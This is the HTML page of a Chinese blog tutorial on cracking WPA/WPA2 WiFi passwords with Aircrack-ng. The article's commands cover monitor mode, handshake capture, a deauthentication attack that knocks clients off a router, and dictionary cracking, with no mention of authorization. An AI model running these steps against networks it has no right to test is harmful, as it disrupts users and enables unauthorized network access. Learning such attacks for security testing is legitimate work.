@@ -1,0 +1,287 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>WiFi 密码破解 | YGKing</title><meta name="author" content="搁浅,id6543156918@gmail.com"><meta name="copyright" content="搁浅"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="介绍本篇将介绍如何使用  Aircrack-ng 对 WPA&#x2F;WPA2 协议进行握手攻击，获取握手包以供离线暴力破解WiFi密码 前提条件 无线网卡 Linux系统，如 Kali aircrack-ng 软件包  准备 Kali Linux 系统自带 aircrack-ng   如果使用其他Linux发行版需要额外安装 aircrack-ng 软件包  Ubuntu1sudo apt i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WiFi 密码破解">
+<meta property="og:url" content="https://tooplick.github.io/WiFi-hacking/index.html">
+<meta property="og:site_name" content="YGKing">
+<meta property="og:description" content="介绍本篇将介绍如何使用  Aircrack-ng 对 WPA&#x2F;WPA2 协议进行握手攻击，获取握手包以供离线暴力破解WiFi密码 前提条件 无线网卡 Linux系统，如 Kali aircrack-ng 软件包  准备 Kali Linux 系统自带 aircrack-ng   如果使用其他Linux发行版需要额外安装 aircrack-ng 软件包  Ubuntu1sudo apt i">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tooplick.github.io/img/Article%20cover/7.webp">
+<meta property="article:published_time" content="2025-12-13T15:34:20.000Z">
+<meta property="article:modified_time" content="2025-12-13T17:16:28.535Z">
+<meta property="article:author" content="搁浅">
+<meta property="article:tag" content="Tutorial">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tooplick.github.io/img/Article%20cover/7.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "WiFi 密码破解",
+  "url": "https://tooplick.github.io/WiFi-hacking/",
+  "image": "https://tooplick.github.io/img/Article%20cover/7.webp",
+  "datePublished": "2025-12-13T15:34:20.000Z",
+  "dateModified": "2025-12-13T17:16:28.535Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "https://github.com/tooplick",
+      "url": "https://github.com/tooplick"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://tooplick.github.io/WiFi-hacking/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><meta/><meta/><meta/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const hour = new Date().getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (theme === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else theme === 'light' ? activateLightMode() : activateDarkMode()
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#87D4FA","bgDark":"#1f1f1f","position":"top-center"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'WiFi 密码破解',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="/css/flash.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/cover.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/toolbar/"><i class="fa-fw fas fa-wrench"></i><span> 工具栏</span></a></div><div class="menus_item"><a class="site-page" href="/Portal/"><i class="fa-fw fas fa-paper-plane"></i><span> 传送门</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-solid fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://github.com/tooplick"><i class="fa-fw fa-brands fa-github"></i><span> GitHub</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/default-top-bg.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">YGKing</span></a><a class="nav-page-title" href="/"><span class="site-name">WiFi 密码破解</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/toolbar/"><i class="fa-fw fas fa-wrench"></i><span> 工具栏</span></a></div><div class="menus_item"><a class="site-page" href="/Portal/"><i class="fa-fw fas fa-paper-plane"></i><span> 传送门</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-solid fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://github.com/tooplick"><i class="fa-fw fa-brands fa-github"></i><span> GitHub</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">WiFi 密码破解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-13T15:34:20.000Z" title="发表于 2025-12-13 23:34:20">2025-12-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-13T17:16:28.535Z" title="更新于 2025-12-14 01:16:28">2025-12-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Technology/">Technology</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">364</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>1分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>本篇将介绍如何使用  <a target="_blank" rel="noopener" href="https://www.aircrack-ng.org/"><strong>Aircrack-ng</strong></a> 对 WPA&#x2F;WPA2 协议进行握手攻击，获取握手包以供离线暴力破解WiFi密码</p>
+<h1 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h1><ol>
+<li>无线网卡</li>
+<li>Linux系统，如 Kali</li>
+<li>aircrack-ng 软件包</li>
+</ol>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
+<li>Kali Linux 系统自带 aircrack-ng  </li>
+<li>如果使用其他Linux发行版需要额外安装 aircrack-ng 软件包</li>
+</ul>
+<h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install aircrack-ng  </span><br></pre></td></tr></table></figure>
+
+<h3 id="Arch-Linux"><a href="#Arch-Linux" class="headerlink" title="Arch Linux"></a>Arch Linux</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S aircrack-ng  </span><br></pre></td></tr></table></figure>
+
+<h3 id="其他Linux发行版请自行安装"><a href="#其他Linux发行版请自行安装" class="headerlink" title="其他Linux发行版请自行安装"></a>其他Linux发行版请自行安装</h3><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><h3 id="启用root账号"><a href="#启用root账号" class="headerlink" title="启用root账号"></a>启用root账号</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看网络设备"><a href="#查看网络设备" class="headerlink" title="查看网络设备"></a>查看网络设备</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure>
+
+<h3 id="网卡开启监听模式"><a href="#网卡开启监听模式" class="headerlink" title="网卡开启监听模式"></a>网卡开启监听模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+
+<h3 id="嗅探WiFi"><a href="#嗅探WiFi" class="headerlink" title="嗅探WiFi"></a>嗅探WiFi</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
+<h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><h3 id="启动抓包"><a href="#启动抓包" class="headerlink" title="启动抓包"></a>启动抓包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -w capture -c 信道 --bssid 路由器MAC wlan0mon</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Tips:<br><strong>capture</strong> 为保存的握手包名称<br>该命令用于抓取 WPA&#x2F;WPA2 四次握手包，用于离线密码破解</p>
+</blockquote>
+<h3 id="取消认证攻击"><a href="#取消认证攻击" class="headerlink" title="取消认证攻击"></a>取消认证攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 5 -a 路由器MAC -c 客户端MAC wlan0mon</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Tips:<br><code>5</code>: 发送 5 个断开连接数据包<br><code>客户端MAC</code> 请查看目录下<code>.csv</code>文件<br> 这是一个 Deauthentication（取消认证）攻击命令，用于强制目标设备与Wi-Fi路由器断开连接，以便捕获WPA握手包</p>
+</blockquote>
+<p>握手包将会保存为<code>.cap</code>文件，用于离线破解</p>
+<h3 id="关闭监听模式"><a href="#关闭监听模式" class="headerlink" title="关闭监听模式"></a>关闭监听模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure>
+
+<h2 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h2><h3 id="使用-aircrack-ng-简单破解"><a href="#使用-aircrack-ng-简单破解" class="headerlink" title="使用 aircrack-ng 简单破解"></a>使用 aircrack-ng 简单破解</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w  字典文件.txt 抓取握手包名称.<span class="built_in">cap</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="高级破解"><a href="#高级破解" class="headerlink" title="高级破解"></a>高级破解</h3><p>复杂密码可以使用  <a target="_blank" rel="noopener" href="https://www.passcape.com/index.php?section=downloads&category=29"><strong>WIFIPR</strong></a> 或 <a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/"><strong>hashcat</strong></a> 破解，本教程将不多赘述</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/tooplick">https://github.com/tooplick</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://tooplick.github.io/WiFi-hacking">https://tooplick.github.io/WiFi-hacking</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://tooplick.github.io" target="_blank">YGKing</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Tutorial/">Tutorial</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/Nekro-Endpoint/" title="Nekro Endpoint 边缘端点"><img class="cover" src="/img/Article%20cover/6.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Nekro Endpoint 边缘端点</div></div><div class="info-2"><div class="info-item-1">Nekro Endpoint在边缘构建你的 API 端点，支持静态内容、代理转发、动态脚本执行。 Github 地址：https://github.com/NekroAI/nekro-endpoint 项目介绍Nekro Endpoint 是一个基于 Cloudflare Workers 的轻量级端点平台，支持三种端点类型转发：  Static：静态内容   Proxy：代理转发   Script：动态脚本执行  依托 Cloudflare 全球 300+ 节点网络，实现端点的 全球加速 与 低延迟响应。 我的端点网址：edge.ygking.top   以下所有工具都保存在 tooplick.github.io 仓库，为防止网络问题无法访问而添加边缘端点转发 Tools7zip-x64.exe  geek.exe   Recoverit.zip   VMware-workstation-full-17.6.1-24319023.exe songs_download_windows_v2.1.1.zip   WebAyuGram.zip ChromeSetup.exe   Adv...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/Nekro-Agent-install/" title="Nekro Agent 部署"><img class="cover" src="/img/Article%20cover/8.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-14</div><div class="info-item-2">Nekro Agent 部署</div></div><div class="info-2"><div class="info-item-1">引言因为官方文档里的Linux部署教程已经足够详尽，本篇会重点介绍Windows系统和软路由系统的部署 Nekro Agent 文档：https://doc.nekro.ai/ Linux部署一键部署 Nekro Agent 核心服务及 Napcat 协议端 警告：  务必修改NapCat默认密码：公网WebU 必须使用强密码（建议12位以上，含数字、字母、符号） 务必使用Token验证：OneBot服务务必设置有效 Token，避免空Token或弱口令 为安全起见，请避免使用默认端口  部署命令从 Github1sudo -E bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/KroMiose/nekro-agent/main/docker/install.sh)&quot; - --with-napcat  如果从 Github 下载脚本遇到网络问题，您可以使用 NekroEndpoint 代理访问部署脚本： 从 NekroEndpoint TIP NekroEndpoint 是基于 Cloudflare...</div></div></div></a><a class="pagination-related" href="/iStoreOS-install/" title="iStoreOS 软路由部署"><img class="cover" src="/img/Article%20cover/9.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-14</div><div class="info-item-2">iStoreOS 软路由部署</div></div><div class="info-2"><div class="info-item-1">介绍iStoreOS + Passwall： 实现局域网内网络加速，Google，Steam或者PUBG，战地…等外网游戏 准备硬件：  一台小主机：咸鱼搜索”1037U”120元；或者任意电脑主机（2核2G内存以上） 如果还有其他需求，请上4h4g配置   一根网线 一个U盘：2G以上 任意显示器+HDMI线  软件：  iStoreOS镜像 refus：写入镜像工具 Passwall插件  软件下载iStoreOS镜像：  官网：https://site.istoreos.com/firmware/download?devicename=x86_64&amp;firmware&#x3D;iStoreOS  refus：  官网：https://rufus.ie/zh/  Passwall：  开源地址：https://github.com/AUK9527/Are-u-ok  开始安装iStoreOS 使用refus将iStoreOS镜像刷入U盘 插入主机启动iStoreOS qu+Tabbu 补全 Tip：如果没有显示器，也可以插网线使用ssh连接 选择Install x86...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/cover.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">搁浅</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tooplick"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Github Page.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">前提条件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">2.1.</span> <span class="toc-text">准备</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu"><span class="toc-number">2.1.1.</span> <span class="toc-text">Ubuntu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arch-Linux"><span class="toc-number">2.1.2.</span> <span class="toc-text">Arch Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96Linux%E5%8F%91%E8%A1%8C%E7%89%88%E8%AF%B7%E8%87%AA%E8%A1%8C%E5%AE%89%E8%A3%85"><span class="toc-number">2.1.3.</span> <span class="toc-text">其他Linux发行版请自行安装</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B"><span class="toc-number">3.</span> <span class="toc-text">开始</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.</span> <span class="toc-text">扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E7%94%A8root%E8%B4%A6%E5%8F%B7"><span class="toc-number">3.1.1.</span> <span class="toc-text">启用root账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87"><span class="toc-number">3.1.2.</span> <span class="toc-text">查看网络设备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E5%8D%A1%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.1.3.</span> <span class="toc-text">网卡开启监听模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%97%85%E6%8E%A2WiFi"><span class="toc-number">3.1.4.</span> <span class="toc-text">嗅探WiFi</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%93%E5%8C%85"><span class="toc-number">3.2.</span> <span class="toc-text">抓包</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E6%8A%93%E5%8C%85"><span class="toc-number">3.2.1.</span> <span class="toc-text">启动抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E6%B6%88%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.2.</span> <span class="toc-text">取消认证攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%97%AD%E7%9B%91%E5%90%AC%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.2.3.</span> <span class="toc-text">关闭监听模式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="toc-number">3.3.</span> <span class="toc-text">破解密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-aircrack-ng-%E7%AE%80%E5%8D%95%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.3.1.</span> <span class="toc-text">使用 aircrack-ng 简单破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.3.2.</span> <span class="toc-text">高级破解</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/WiFi-hacking/" title="WiFi 密码破解">WiFi 密码破解</a><time datetime="2025-12-13T15:34:20.000Z" title="发表于 2025-12-13 23:34:20">2025-12-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Nekro-Endpoint/" title="Nekro Endpoint 边缘端点">Nekro Endpoint 边缘端点</a><time datetime="2025-11-19T17:26:19.000Z" title="发表于 2025-11-20 01:26:19">2025-11-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/My-Github-project/" title="我的 Github 项目">我的 Github 项目</a><time datetime="2025-11-15T06:14:33.000Z" title="发表于 2025-11-15 14:14:33">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/toolbar/" title="工具栏">工具栏</a><time datetime="2025-11-14T10:59:04.000Z" title="发表于 2025-11-14 18:59:04">2025-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/iStoreOS-install/" title="iStoreOS 软路由部署">iStoreOS 软路由部署</a><time datetime="2025-11-14T08:25:30.000Z" title="发表于 2025-11-14 16:25:30">2025-11-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/background.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By 搁浅</span></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
